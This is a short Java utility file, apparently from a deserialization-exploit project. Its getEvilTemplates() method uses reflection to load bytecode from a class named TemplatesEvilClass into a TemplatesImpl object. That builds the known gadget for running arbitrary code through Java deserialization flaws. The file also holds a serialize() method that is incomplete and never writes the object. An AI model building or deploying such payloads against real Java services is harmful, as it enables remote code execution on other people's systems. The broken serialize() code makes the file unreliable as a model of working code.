package ExpUtils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

import static ExpUtils.ReflectUtils.getClassByte;

public class ExpUtils {
    public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
        TemplatesImpl templates = new TemplatesImpl();
        ReflectUtils.setFields(templates,"_name","xxf");
        byte[] evilCode = getClassByte("target/classes/ExpUtils/TemplatesEvilClass.class");
        byte[][] templatesEvilCode = new byte[][]{evilCode};
        ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
        ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());
//        templates.getOutputProperties();
        return templates;
    }

//    序列化对象到特定路径
    public static void serialize(Object obj) throws IOException {
        String path = obj.getClass().getName();
        FileOutputStream fileOutputStream = new FileOutputStream(path);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);

    }



    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException {
        getEvilTemplates();
    }
}
